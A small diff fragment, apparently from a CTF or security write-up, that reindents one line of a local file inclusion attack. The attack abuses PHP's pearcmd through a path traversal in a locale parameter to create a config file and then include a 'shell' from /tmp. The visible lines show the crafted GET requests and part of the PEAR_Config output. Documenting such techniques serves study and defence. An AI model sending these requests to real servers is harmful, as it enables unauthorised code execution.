@@ -787,7 +787,7 @@ GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php
 
 Response after adding it:
 
-	GET /locales/locale.json?locale=../../../../../tmp&namespace=shell HTTP/1.1
+GET /locales/locale.json?locale=../../../../../tmp&namespace=shell HTTP/1.1
 
 #PEAR_Config 0.9
 a:13:{s:7:"php_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/d800233670dcff936968e8dd03f52637
